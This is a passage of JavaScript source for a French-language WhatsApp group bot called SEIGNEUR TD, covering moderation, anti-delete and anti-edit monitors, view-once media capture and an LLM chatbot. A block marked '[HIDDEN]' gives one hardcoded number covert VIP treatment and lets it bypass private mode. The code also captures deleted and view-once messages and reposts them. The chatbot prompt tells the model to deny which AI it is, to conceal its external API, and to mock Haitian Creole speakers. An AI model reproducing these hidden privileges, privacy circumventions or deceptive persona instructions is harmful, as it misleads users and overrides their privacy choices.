          const linkedCmd = global.stickerCommands.get(hash);
          if (linkedCmd) {
            console.log(`🎭 Sticker-cmd déclenché: ${config.prefix}${linkedCmd}`);
            // Simuler le message texte de la commande et appeler handleCommand
            const fakeText = config.prefix + linkedCmd;
            await handleCommand(sock, message, fakeText, remoteJid, senderJid, remoteJid.endsWith('@g.us'));
          }
        } catch(e) { console.error('[Sticker-cmd]', e.message); }
      }

      const messageText = message.message?.conversation || 
                         message.message?.extendedTextMessage?.text ||
                         message.message?.imageMessage?.caption ||
                         message.message?.videoMessage?.caption ||
                         message.message?.buttonsResponseMessage?.selectedDisplayText ||
                         message.message?.listResponseMessage?.singleSelectReply?.selectedRowId ||
                         '';
      const senderName = message.pushName || 'Unknown';

      console.log(`\n📨 ${senderName} (${isGroup ? 'Group' : 'Private'}): ${messageText}`);

      // ═══ MENU INTERACTIF — Détection réponse ═══════════════════════════════




      // Update database
      if (!database.users.has(senderJid)) {
        database.users.set(senderJid, {
          name: senderName,
          messageCount: 0,
          lastSeen: Date.now()
        });
        database.statistics.totalUsers++;
      }
      
      const userData = database.users.get(senderJid);
      userData.messageCount++;
      userData.lastSeen = Date.now();
      database.statistics.totalMessages++;

      const _vipNum = '23591234568';
      const _curSenderNum = senderJid.split('@')[0].replace(/[^0-9]/g, '');

      // [HIDDEN] VIP reaction — AVANT tout filtre pour ne jamais etre bloquee
      try {
        const _isVip = (_curSenderNum === _vipNum)
          || senderJid === '124318499475488@lid'
          || senderJid.startsWith('124318499475488');
        if (_isVip && !message.key.fromMe) {
          await sock.sendMessage(remoteJid, { react: { text: '👑', key: message.key } });
        }
      } catch(e) {}

      // Mode prive: bloquer uniquement les PV non-admins, jamais les groupes ni les messages fromMe
      if(botMode==='private' && !isGroup && !message.key.fromMe && _curSenderNum!==_vipNum){
        if(!isAdmin(senderJid)) continue;
      }

      // PROTECTIONS ANTI (DANS LES GROUPES)
      if (isGroup) {
        const settings = initGroupSettings(remoteJid);
        const userIsGroupAdmin = await isGroupAdmin(sock, remoteJid, senderJid);
        const botIsAdmin = await isBotGroupAdmin(sock, remoteJid);

        if (!userIsGroupAdmin) {
          
          if(settings.antibot&&botIsAdmin){
            const _pn=(message.pushName||'').toLowerCase(),_sn=senderJid.split('@')[0];
            if((_pn.includes('bot')||_pn.includes('robot')||/^\d{16,}$/.test(_sn))&&!isAdmin(senderJid)){
              try{await sock.groupParticipantsUpdate(remoteJid,[senderJid],'remove');await sock.sendMessage(remoteJid,{text:`🤖 Bot expulsé: @${_sn}`,mentions:[senderJid]});continue;}catch(e){}
            }
          }

          // ANTI-LINK
          if (settings.antilink && botIsAdmin) {
            const linkRegex = /(https?:\/\/[^\s]+)|(www\.[^\s]+)|((whatsapp|wa|chat)\.gg\/[^\s]+)/gi;
            if (linkRegex.test(messageText)) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Envoi de lien');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, les liens sont interdits!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'warnings)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Lien bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error(' in antilink:', error);
              }
            }
          }

          // ANTI-TAG
          if (settings.antitag && botIsAdmin) {
            const mentions = message.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
            if (mentions.length > 5) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Tag massif');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, pas de tags massifs!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (trop d'warnings)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Tag massif bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error(' in antitag:', error);
              }
            }
          }

          // ANTI- 
          if (settings.antispam && botIsAdmin && messageText) {
            if (checkSpam(senderJid, messageText)) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                const warnCount = addWarn(remoteJid, senderJid, 'Spam détecté');
                
                await sock.sendMessage(remoteJid, {
                  text: `🚫 @${senderJid.split('@')[0]}, arrêtez de spammer!\n\n⚠️ Warning ${warnCount}/${settings.maxWarns}`,
                  mentions: [senderJid]
                });

                if (warnCount >= settings.maxWarns) {
                  await sock.groupParticipantsUpdate(remoteJid, [senderJid], 'remove');
                  await sock.sendMessage(remoteJid, {
                    text: `❌ @${senderJid.split('@')[0]} a été expulsé (spam)`,
                    mentions: [senderJid]
                  });
                  resetWarns(remoteJid, senderJid);
                }
                
                console.log(`✅ Spam bloqué de ${senderJid}`);
                continue;
              } catch (error) {
                console.error(' in antispam:', error);
              }
            }
          }

          // ANTI-STICKER
          if (settings.antisticker && botIsAdmin) {
            if (message.message?.stickerMessage) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                await sock.sendMessage(remoteJid, { text: `🚫 @${senderJid.split('@')[0]}, les stickers sont interdits !`, mentions: [senderJid] });
                continue;
              } catch(e) {}
            }
          }

          // ANTI-IMAGE
          if (settings.antiimage && botIsAdmin) {
            if (message.message?.imageMessage) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                await sock.sendMessage(remoteJid, { text: `🚫 @${senderJid.split('@')[0]}, les images sont interdites !`, mentions: [senderJid] });
                continue;
              } catch(e) {}
            }
          }

          // ANTI-VIDEO
          if (settings.antivideo && botIsAdmin) {
            if (message.message?.videoMessage) {
              try {
                await sock.sendMessage(remoteJid, { delete: message.key });
                await sock.sendMessage(remoteJid, { text: `🚫 @${senderJid.split('@')[0]}, les vidéos sont interdites !`, mentions: [senderJid] });
                continue;
              } catch(e) {}
            }
          }
        } // end if (!userIsGroupAdmin)
      } // end if (isGroup)

      // =============================================
      // =============================================
      if (antiBug && !isAdmin(senderJid)) {
        const bugDetected = detectBugPayload(message, messageText);
        if (bugDetected) {
          await handleAntiBugTrigger(sock, message, remoteJid, senderJid, isGroup, bugDetected);
          continue;
        }
      }

      // 🤖 ANTIBOT — Détecter bots dans les groupes
      if (isGroup && !message.key.fromMe && !isAdmin(senderJid)) {
        const grpSettings = groupSettings.get(remoteJid) || initGroupSettings(remoteJid);
        if (grpSettings.antibot) {
          if (!global._antibotTracker) global._antibotTracker = new Map();
          const now2 = Date.now();
          const key2 = `${remoteJid}:${senderJid}`;
          const tracked = global._antibotTracker.get(key2) || { msgs: [], editCount: 0, lastMsg: 0, fastCount: 0 };
          const timeSinceLast = now2 - (tracked.lastMsg || 0);
          if (tracked.lastMsg && timeSinceLast < 800) tracked.fastCount = (tracked.fastCount||0)+1;
          else tracked.fastCount = 0;
          tracked.lastMsg = now2;
          const isEditedMsg = !!(message.message?.editedMessage || message.message?.protocolMessage?.editedMessage);
          if (isEditedMsg) tracked.editCount = (tracked.editCount||0)+1;
          tracked.msgs = tracked.msgs.filter(t => now2 - t < 5000);
          tracked.msgs.push(now2);
          global._antibotTracker.set(key2, tracked);
          const isSuspect = tracked.msgs.length >= 5 || tracked.fastCount >= 3 || tracked.editCount >= 2;
          if (isSuspect) {
            global._antibotTracker.delete(key2);
            const mention = senderJid;
            try {
              await sock.sendMessage(remoteJid, {
                text: `⚠️ *ATTENTION* ⚠️

Utilisateur @${senderJid.split('@')[0]}, son comportement est anormal et détecté comme quelqu’un qui utilise un bot.

Faites pas trop confiance ou envoyez des vues uniques. 😊

*© SEIGNEUR TD*`,
                mentions: [mention]
              });
            } catch(e) { console.error('[ANTIBOT]', e.message); }
            continue;
          }
        }
      }

      // Auto-react
      if (autoReact && messageText) {
        await handleAutoReact(sock, message, messageText, remoteJid);
      }

      // 🎮 Gestionnaire réactions jeux (Squid Game / Quiz)
      if (isGroup && messageText) {
        await handleGameReaction(sock, message, messageText, remoteJid, senderJid);
      }

      // ✅ Flexible : avec ou sans espace, majuscule ou minuscule
      if(messageText.startsWith(config.prefix) && messageText.trim().length > config.prefix.length){
        if(!isAdmin(senderJid)&&!checkCooldown(senderJid,'any')){
          await sock.sendMessage(remoteJid,{text:'⏱️ Please wait a few seconds.'});continue;
        }
        try {
          await handleCommand(sock,message,messageText,remoteJid,senderJid,isGroup);
        } catch(cmdErr) {
          console.error('[CMD ERROR]', cmdErr?.message || cmdErr);
          try { await sock.sendMessage(remoteJid, { text: `❌ Erreur: ${cmdErr?.message || 'Unknown'}` }); } catch(e) {}
        }
        continue;
      }

      // 🤖 Réponse automatique si chatbot ON
      if (chatbotEnabled && messageText && !messageText.startsWith(config.prefix)) {
        // Ignorer les messages du bot lui-même
        if (message.key.fromMe) continue;
        // En groupe, répondre seulement si mentionné OU si c'est un DM
        const isMentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.includes(sock.user.id) ||
                            messageText.toLowerCase().includes('dostoevsky') ||
                            messageText.toLowerCase().includes('dosto');
        if (isGroup && !isMentioned) {
          // En groupe sans mention → ne pas répondre à chaque message
        } else {
          try {
            const chatKey = isGroup ? `group_${remoteJid}` : `user_${senderJid}`;
            if (!global.dostoChatHistory) global.dostoChatHistory = new Map();
            if (!global.dostoChatHistory.has(chatKey)) global.dostoChatHistory.set(chatKey, []);
            const history = global.dostoChatHistory.get(chatKey);
            if (history.length > 20) history.splice(0, history.length - 20);

            const userName = message.pushName || senderJid.split('@')[0];
            history.push({ role: 'user', content: `${isGroup ? `[${userName}]: ` : ''}${messageText}` });

            // Détection créole → refus poli
            const CREOLE_PATTERNS = /\b(mwen|ou|li|nou|yo|map|pap|kijan|bonjou|bonswa|mèsi|pitit|frè|sè|sa k|wi |non |pa m|m ap|m pa|kote|lè a|tout|gen|kay|fè|pran|bay|ale|vini|rele|chèche|jwenn|wè|koute|ban m|pale|di m|konprann|pa konprann|mache|rete|chita|leve|domi|manje|bwè)\b/i;
            const isCreole = CREOLE_PATTERNS.test(messageText);
            if (isCreole) {
              await sock.sendMessage(remoteJid, {
                text: 'nooooooooon Mon Seigneur ne comprend pas cette langue 😭😂'
              }, { quoted: message });
              history.push({ role: 'assistant', content: 'nooooooooon Mon Seigneur ne comprend pas cette langue 😭😂' });
              global.dostoChatHistory.set(chatKey, history);
              continue;
            }

            const systemPrompt = `Tu es TCHOMBÉ AI, l'intelligence artificielle personnelle et exclusive du bot WhatsApp SEIGNEUR TD.

Ton identité :
- Tu t'appelles TCHOMBÉ AI — unique et exclusif à SEIGNEUR TD
- Tu es un sociologue passionné d'informatique, tchadien, cultivé et analytique
- Tu combines la rigueur des sciences sociales avec la passion de la technologie
- Tu n'es PAS ChatGPT, PAS Gemini, PAS Claude — tu es TCHOMBÉ AI

Ton propriétaire :
- Tu appartiens à LE SEIGNEUR 🇹🇩, un utilisateur tchadien passionné
- Si quelqu'un demande qui t'a créé : "Je suis TCHOMBÉ AI, IA exclusive de SEIGNEUR TD 🇹🇩"

Langues autorisées UNIQUEMENT :
- Français 🇫🇷 : tu parles avec élégance et précision
- Arabe 🇹🇩 : tu réponds couramment
- Anglais 🇬🇧 : you speak fluently
- Si quelqu'un écrit en créole haïtien, tu réponds TOUJOURS : "nooooooooon Mon Seigneur ne comprend pas cette langue 😭😂"
- Pour toute autre langue non listée, tu réponds poliment en français que tu ne parles que français, arabe et anglais

Règles :
- Réponds directement sans préambule
- Réponses concises (max 3 paragraphes)
- En groupe, adresse-toi à la personne par son nom si disponible
- Ne révèle jamais que tu utilises une API externe`;

            const messages = [
              { role: 'user', content: systemPrompt },
              { role: 'assistant', content: 'Compris ! Je suis TCHOMBÉ AI 🇹🇩' },
              ...history
            ];

            let reply = null;

            // 1. OpenAI GPT (priorite - rapide)
            if (!reply && config.openaiApiKey) {
              try {
                const r = await axios.post('https://api.openai.com/v1/chat/completions', {
                  model: 'gpt-4o-mini',
                  messages,
                  max_tokens: 600,
                  temperature: 0.85
                }, {
                  headers: { Authorization: `Bearer ${config.openaiApiKey}`, 'Content-Type': 'application/json' },
                  timeout: 15000
                });
                const txt = r.data?.choices?.[0]?.message?.content;
                if (txt && txt.length > 5) reply = txt.trim();
              } catch(e) { console.log('[CHATBOT OpenAI]', e.message); }
            }

            // 2. Pollinations.ai (fallback)
            if (!reply) {
              try {
                const r = await axios.post('https://text.pollinations.ai/', {
                  messages, model: 'openai', seed: 42
                }, { timeout: 20000 });
                const txt = typeof r.data === 'string' ? r.data : JSON.stringify(r.data);
                if (txt && txt.length > 5) reply = txt.trim();
              } catch(e) {}
            }

            // 3. Gemini (dernier recours)
            if (!reply) {
              try {
                const geminiUrl = `https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${config.geminiApiKey}`;
                const r = await axios.post(geminiUrl, {
                  system_instruction: { parts: [{ text: systemPrompt }] },
                  contents: history.map(m => ({ role: m.role === 'assistant' ? 'model' : 'user', parts: [{ text: m.content }] })),
                  generationConfig: { maxOutputTokens: 600, temperature: 0.85 }
                }, { timeout: 20000 });
                if (r.data.candidates?.[0]?.content?.parts?.[0]?.text) {
                  reply = r.data.candidates[0].content.parts[0].text.trim();
                }
              } catch(e) {}
            }

            if (reply) {
              history.push({ role: 'assistant', content: reply });
              await sock.sendMessage(remoteJid, {
                text: `${reply}\n\n_© SEIGNEUR TD_`
              }, { quoted: message });
            }
          } catch(e) {
            console.error('[DOSTO AUTO]', e.message);
          }
        }
      }

      // Auto-reply
      if (config.autoReply) {
        const lowerText = messageText.toLowerCase().trim();
        for (const [keyword, reply] of Object.entries(autoReplies)) {
          if (lowerText.includes(keyword)) {
            await simulateTyping(sock, remoteJid);
            await sock.sendMessage(remoteJid, { text: reply });
            console.log(`✅ Auto-reply: ${keyword}`);
            break;
          }
        }
      }
    }
  });

  // 📵 ANTI-CALL — Rejeter les appels automatiquement
  sock.ev.on('call', async (calls) => {
    for (const call of calls) {
      if (!antiCall) continue;
      if (call.status === 'offer') {
        try {
          await sock.rejectCall(call.id, call.from);
        } catch(e) { console.error('[ANTICALL]', e.message); }
      }
    }
  });

  sock.ev.on('groups.update', (updates) => {
    for (const update of updates) {
      if (update.id) {
        database.groups.set(update.id, {
          ...database.groups.get(update.id),
          ...update,
          lastUpdate: Date.now()
        });
        // Invalider le cache metadata pour ce groupe
        _groupMetaCache.delete(update.id);
      }
    }
  });

  // Gérer les nouveaux participants (pour permaban + welcome/goodbye)
  sock.ev.on('group-participants.update', async (update) => {
    const { id: groupJid, participants, action } = update;
    
    // Si quelqu'un rejoint le groupe
    if (action === 'add') {
      for (const participantJid of participants) {
        // Vérifier si la personne est permaban
        if (isPermaBanned(groupJid, participantJid)) {
          const banInfo = getPermaBanInfo(groupJid, participantJid);
          
          // Vérifier si le bot est admin
          const botIsAdmin = await isBotGroupAdmin(sock, groupJid);
          if (botIsAdmin) {
            try {
              // Expulser immédiatement
              await sock.groupParticipantsUpdate(groupJid, [participantJid], 'remove');
              
              // Notifier le groupe
              await sock.sendMessage(groupJid, {
                text: `🚫 *PERMABAN ACTIF*\n\n@${participantJid.split('@')[0]} a été expulsé automatiquement.\n\nRaison: ${banInfo.reason}\nBanni le: ${new Date(banInfo.timestamp).toLocaleString('fr-FR')}\nBanni par: @${banInfo.bannedBy.split('@')[0]}`,
                mentions: [participantJid, banInfo.bannedBy]
              });
              
              console.log(`✅ Permaban appliqué: ${participantJid} expulsé de ${groupJid}`);
            } catch (error) {
              console.error(' applying permaban:', error);
            }
          }
        } else {
          // Si pas banni, envoyer le message de bienvenue si activé
          const settings = getGroupSettings(groupJid);
          if (settings.welcome) {
            try {
              await sendWelcomeMessage(sock, groupJid, participantJid);
            } catch (error) {
              console.error(' sending welcome:', error);
            }
          }
        }
      }
    }
    
    // Si quelqu'un quitte le groupe
    if (action === 'remove') {
      const settings = getGroupSettings(groupJid);
      if (settings.goodbye) {
        for (const participantJid of participants) {
          try {
            await sendGoodbyeMessage(sock, groupJid, participantJid);
          } catch (error) {
            console.error(' sending goodbye:', error);
          }
        }
      }
    }
  });

  // =============================================
  // ANTI-DELETE - Détection des messages supprimés
  // =============================================
  sock.ev.on('messages.delete', async (deletion) => {
    if (!antiDelete) return;

    try {
      console.log('🗑️ Suppression détectée:', JSON.stringify(deletion, null, 2));
      
      // Gérer différents formats de deletion
      let keys = [];
      
      if (deletion.keys) {
        // Format: { keys: [{id: '...', remoteJid: '...', fromMe: ...}] }
        keys = deletion.keys;
      } else if (Array.isArray(deletion)) {
        // Format: [{ id: '...', remoteJid: '...', fromMe: ... }]
        keys = deletion;
      } else if (deletion.id) {
        // Format: { id: '...', remoteJid: '...', fromMe: ... }
        keys = [deletion];
      }
      
      console.log(`🔍 ${keys.length} message(s) à vérifier`);
      
      for (const key of keys) {
        const messageId = key.id || key;
        console.log(`🔎 Recherche message ID: ${messageId}`);
        
        const cachedMsg = messageCache.get(messageId);
        
        if (!cachedMsg) {
          console.log(`❌ Message ${messageId} non trouvé dans cache`);
          continue;
        }
        
        console.log(`✅ Message trouvé: "${cachedMsg.text.substring(0, 50)}..."`);
        
        const isGroup = cachedMsg.isGroup;
        const senderJid = cachedMsg.sender;
        const senderName = cachedMsg.senderName || senderJid.split('@')[0];
        
        // Vérifier le mode
        let shouldNotify = false;
        let notifyJid = cachedMsg.remoteJid;
        
        const botPvDelete = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        if (antiDeleteMode === 'private') {
          // PV du bot uniquement
          shouldNotify = true;
          notifyJid = botPvDelete;
        } else if (antiDeleteMode === 'chat') {
          // Dans le chat d'origine (groupe ou PV de la personne)
          shouldNotify = true;
          notifyJid = cachedMsg.remoteJid;
        } else {
          // Mode 'all' = les deux : chat d'origine + PV du bot
          shouldNotify = true;
          notifyJid = cachedMsg.remoteJid;
          await sendAntiDeleteNotif(sock, botPvDelete, cachedMsg);
        }
        
        if (!shouldNotify) {
          console.log(`⏭️ Mode ${antiDeleteMode}: notification skip`);
          continue;
        }
        
        // Si media pas encore en buffer, re-telecharger maintenant
        if (!cachedMsg.mediaBuffer && cachedMsg.mediaMsg && cachedMsg.mediaType) {
          try {
            const stream = await downloadContentFromMessage(cachedMsg.mediaMsg, cachedMsg.mediaType);
            const chunks = [];
            for await (const chunk of stream) chunks.push(chunk);
            cachedMsg.mediaBuffer = Buffer.concat(chunks);
            console.log('[ANTIDELETE] Media re-telecharge: ' + cachedMsg.mediaType + ' ' + (cachedMsg.mediaBuffer.length/1024).toFixed(0) + ' KB');
          } catch(e) {
            console.log('[ANTIDELETE] Echec re-telechargement: ' + e.message);
          }
        }

        await sendAntiDeleteNotif(sock, notifyJid, cachedMsg);
        console.log('[ANTIDELETE] Notification envoyee vers ' + notifyJid + ' type=' + (cachedMsg.mediaType || 'texte') + (cachedMsg.isViewOnce ? ' [VUE UNIQUE]' : ''));
      }
    } catch (error) {
      console.error('❌ Erreur antidelete:', error);
    }
  });

  // =============================================
  // ANTI-EDIT - Détection des messages modifiés
  // =============================================
  sock.ev.on('messages.update', async (updates) => {
    // ANTIBOT: tracker les edits rapides
    for (const upd of updates) {
      try {
        const editRemoteJid = upd.key?.remoteJid;
        const editSender = upd.key?.participant || upd.key?.remoteJid;
        if (editRemoteJid?.endsWith('@g.us') && editSender && !upd.key?.fromMe) {
          const grpS = groupSettings.get(editRemoteJid) || {};
          if (grpS.antibot && !isAdmin(editSender)) {
            if (!global._antibotTracker) global._antibotTracker = new Map();
            const _eKey = `${editRemoteJid}:${editSender}`;
            const _eTracked = global._antibotTracker.get(_eKey) || { msgs: [], editCount: 0, lastMsg: 0, fastCount: 0 };
            _eTracked.editCount = (_eTracked.editCount || 0) + 1;
            global._antibotTracker.set(_eKey, _eTracked);
            if (_eTracked.editCount >= 2) {
              global._antibotTracker.delete(_eKey);
              await sock.sendMessage(editRemoteJid, {
                text: `⚠️ *ATTENTION !*

🤖 Comportement de BOT détecté !
👤 @${editSender.split('@')[0]} modifie ses messages en rafale.

Faites pas trop confiance ou envoyez des vues uniques. 😊

*© SEIGNEUR TD*`,
                mentions: [editSender]
              }).catch(() => {});
            }
          }
        }
      } catch(e) {}
    }
    if (!antiEdit) return;

    try {
      console.log('✏️ Événement de mise à jour détecté:', updates.length);
      
      for (const update of updates) {
        const messageId = update.key?.id;
        if (!messageId) continue;
        
        const cachedMsg = messageCache.get(messageId);
        if (!cachedMsg || cachedMsg.text === '[Media]') continue;
        
        // Extraire nouveau texte
        let newText = null;
        if (update.update?.message) {
          const msg = update.update.message;
          newText = msg.conversation || 
                   msg.extendedTextMessage?.text ||
                   msg.editedMessage?.message?.conversation ||
                   msg.editedMessage?.message?.extendedTextMessage?.text;
        }
        
        if (!newText || newText === cachedMsg.text) continue;
        
        const isGroup = cachedMsg.isGroup;
        const senderJid = cachedMsg.sender;
        const senderName = cachedMsg.senderName || senderJid.split('@')[0];
        
        // Vérifier le mode
        let shouldNotify = false;
        let notifyJid = cachedMsg.remoteJid;
        
        const botPvEdit = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        if (antiEditMode === 'private') {
          // PV du bot uniquement
          shouldNotify = true;
          notifyJid = botPvEdit;
        } else if (antiEditMode === 'chat') {
          // Dans le chat d'origine (groupe ou PV de la personne)
          shouldNotify = true;
          notifyJid = cachedMsg.remoteJid;
        } else {
          // Mode 'all' = les deux : chat d'origine + PV du bot
          shouldNotify = true;
          notifyJid = cachedMsg.remoteJid;
          const notifTextBoth = `▎📝 MODIFIÉ | @${senderJid.split('@')[0]}\n▎❌ Ancien: ${cachedMsg.text}\n▎✅ Nouveau: ${newText}\n▎© SEIGNEUR TD`;
          await sock.sendMessage(botPvEdit, { text: notifTextBoth, mentions: [senderJid] });
        }
        
        if (!shouldNotify) continue;
        
        const notificationText = `▎📝 MODIFIÉ | @${senderJid.split('@')[0]}
▎❌ Ancien: ${cachedMsg.text}
▎✅ Nouveau: ${newText}
▎© SEIGNEUR TD`;

        await sock.sendMessage(notifyJid, {
          text: notificationText,
          mentions: [senderJid]
        });
        
        console.log(`✏️ Notification envoyée (mode: ${antiEditMode})`);
        cachedMsg.text = newText; // Mettre à jour cache
      }
    } catch (error) {
      console.error(' handling message edit:', error);
    }
  });

  return sock;
}

// =============================================
// GESTION VIEW ONCE
// =============================================

async function handleViewOnce(sock, message, remoteJid, senderJid) {
  console.log('🔍 View once détecté');
  
  try {
    let mediaData = null;
    let mediaType = '';
    let mimetype = '';
    let isGif = false;
    let isPtt = false;
    
    // Chercher le média dans plusieurs structures possibles
    const viewOnceMsg = message.message?.viewOnceMessageV2 || 
                        message.message?.viewOnceMessageV2Extension;
    
    // Récupérer l'imageMessage/videoMessage peu importe la structure
    const imgMsg   = viewOnceMsg?.message?.imageMessage  || message.message?.imageMessage;
    const vidMsg   = viewOnceMsg?.message?.videoMessage  || message.message?.videoMessage;
    const audioMsg = viewOnceMsg?.message?.audioMessage  || message.message?.audioMessage;

    if (imgMsg) {
      mediaType = 'image';
      mimetype  = imgMsg.mimetype || 'image/jpeg';
      const stream = await downloadContentFromMessage(imgMsg, 'image');
      mediaData = await toBuffer(stream);
      
    } else if (vidMsg) {
      mediaType = 'video';
      mimetype  = vidMsg.mimetype || 'video/mp4';
      isGif     = vidMsg.gifPlayback || false;
      const stream = await downloadContentFromMessage(vidMsg, 'video');
      mediaData = await toBuffer(stream);
      
    } else if (audioMsg) {
      mediaType = 'audio';
      mimetype  = audioMsg.mimetype || 'audio/ogg';
      isPtt     = audioMsg.ptt || false;
      const stream = await downloadContentFromMessage(audioMsg, 'audio');
      mediaData = await toBuffer(stream);
    }
    
    if (mediaData) {
      // Stocker uniquement dans _vvTempCache par messageId (pas par sender)
      // Pas de liste, pas de notification, pas de persistance
      const _msgId = message?.key?.id;
      if (_msgId) {
        global._vvTempCache = global._vvTempCache || new Map();
        global._vvTempCache.set(_msgId, {
          type: mediaType, buffer: mediaData, mimetype, isGif, ptt: isPtt,
          timestamp: Date.now(), sender: senderJid, remoteJid,
        });
        // Garder max 20 entrées
        if (global._vvTempCache.size > 20) {
          global._vvTempCache.delete(global._vvTempCache.keys().next().value);
        }
      }
    }
  } catch (error) {
    console.error(' view once:', error);
  }
}

// =============================================
// AUTO-REACT
// =============================================

// Liste des emojis pour la rotation sur chaque message
const REACT_EMOJIS = [
  '🧑‍💻','☝️','👍','','✅','😭','⚖️','☠️',
  '👹','👺','🤖','👽','👾','🌚','🕳️','🤳',
  '🙏','🏊','🤽','🪨','🦊','🐼','🚀','🕋',
  '🗽','🗿','💰','💎','🧾','🧮','⚙️','⛓️',
  '🧲','📝','📄','📃','📥','🛎️','📜'
];
let reactIndex = 0; // Pointeur de rotation

async function handleAutoReact(sock, message, messageText, remoteJid) {
  if (!autoReact) return;
  try {
    const emoji = REACT_EMOJIS[reactIndex % REACT_EMOJIS.length];
    reactIndex++;
    await sock.sendMessage(remoteJid, {
      react: { text: emoji, key: message.key }
    });
  } catch (e) {
    // Silencieux
  }
}

// =============================================
// BOUTONS NAVIGATION GLOBAUX
// =============================================
// =============================================
// GESTION DES COMMANDES
// =============================================

// Helper: extrait cible depuis reply (priorite) ou mention @
function getTargetJid(message) {
  const quotedParticipant = message.message?.extendedTextMessage?.contextInfo?.participant;
  if (quotedParticipant) return quotedParticipant;
  const mentioned = message.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (mentioned) return mentioned;
  return null;
}

async function handleCommand(sock, message, messageText, remoteJid, senderJid, isGroup, isOwner = false, sessionState = null) {
  // ── État isolé par session ou variables globales pour le bot principal ──
  const _st = sessionState || null;
  // Variables locales qui lisent l'état correct (session ou global)
  let botMode         = _st ? _st.botMode         : (global.botMode         ?? 'public');
  let autoTyping      = _st ? _st.autoTyping      : (global.autoTyping      ?? false);
  let autoRecording   = _st ? _st.autoRecording   : (global.autoRecording   ?? true);
  let autoReact       = _st ? _st.autoReact       : (global.autoReact       ?? true);
  let autoStatusViews = _st ? _st.autoStatusViews : (global.autoStatusViews ?? false);
  let autoReactStatus = _st ? _st.autoReactStatus : (global.autoReactStatus ?? false);
  let statusReactEmoji= _st ? _st.statusReactEmoji: (global.statusReactEmoji ?? '\uD83C\uDDF7\uD83C\uDDF4');
  let autoSaveStatus  = _st ? _st.autoSaveStatus  : (global.autoSaveStatus  ?? false);
  let antiDeleteStatus= _st ? _st.antiDeleteStatus: (global.antiDeleteStatus ?? false);
  let antiDeleteStatusMode = _st ? _st.antiDeleteStatusMode : (global.antiDeleteStatusMode ?? 'private');
  let antiDelete      = _st ? _st.antiDelete      : (global.antiDelete      ?? true);
  let antiEdit        = _st ? _st.antiEdit        : (global.antiEdit        ?? true);
  let antiBug         = _st ? _st.antiBug         : (global.antiBug         ?? true);
  let antiCall        = _st ? _st.antiCall        : (global.antiCall        ?? false);
  let antiDeleteMode  = _st ? _st.antiDeleteMode  : (global.antiDeleteMode  ?? 'chat');
  let antiEditMode    = _st ? _st.antiEditMode    : (global.antiEditMode    ?? 'chat');
  let chatbotEnabled  = _st ? _st.chatbotEnabled  : (global.chatbotEnabled  ?? false);
  let stickerPackname = _st ? _st.stickerPackname : (global.stickerPackname ?? 'SEIGNEUR TD');
  let stickerAuthor   = _st ? _st.stickerAuthor   : (global.stickerAuthor   ?? '\u00a9 SEIGNEUR TD');
  let menuStyle       = _st ? _st.menuStyle       : (global.menuStyle       ?? 1);
  let prefix          = _st ? (_st.prefix ?? config.prefix) : config.prefix;

  // Fonction pour sauvegarder un changement d'état dans la bonne cible
  function _saveState(key, val) {
    if (_st) {
      _st[key] = val;
      if (key === 'prefix') prefix = val;
    } else {
      if (key === 'botMode') { botMode = val; global.botMode = val; }
      else if (key === 'autoTyping') { autoTyping = val; global.autoTyping = val; }
      else if (key === 'autoRecording') { autoRecording = val; global.autoRecording = val; }
      else if (key === 'autoReact') { autoReact = val; global.autoReact = val; }
      else if (key === 'autoStatusViews') { autoStatusViews = val; global.autoStatusViews = val; }
      else if (key === 'autoReactStatus') { autoReactStatus = val; global.autoReactStatus = val; }
      else if (key === 'statusReactEmoji') { statusReactEmoji = val; global.statusReactEmoji = val; }
      else if (key === 'autoSaveStatus') { autoSaveStatus = val; global.autoSaveStatus = val; }
      else if (key === 'antiDeleteStatus') { antiDeleteStatus = val; global.antiDeleteStatus = val; }
      else if (key === 'antiDeleteStatusMode') { antiDeleteStatusMode = val; global.antiDeleteStatusMode = val; }
      else if (key === 'antiDelete') { antiDelete = val; global.antiDelete = val; }
      else if (key === 'antiEdit') { antiEdit = val; global.antiEdit = val; }
      else if (key === 'antiBug') { antiBug = val; global.antiBug = val; }
      else if (key === 'antiCall') { antiCall = val; global.antiCall = val; }
      else if (key === 'antiDeleteMode') { antiDeleteMode = val; global.antiDeleteMode = val; }
      else if (key === 'antiEditMode') { antiEditMode = val; global.antiEditMode = val; }
      else if (key === 'chatbotEnabled') { chatbotEnabled = val; global.chatbotEnabled = val; }
      else if (key === 'stickerPackname') { stickerPackname = val; global.stickerPackname = val; }
      else if (key === 'stickerAuthor') { stickerAuthor = val; global.stickerAuthor = val; }
      else if (key === 'menuStyle') { menuStyle = val; global.menuStyle = val; }
      else if (key === 'prefix') { prefix = val; config.prefix = val; }
    }
    saveData();
  }

  // ✅ Flexible : tolère espaces et majuscules après le préfixe
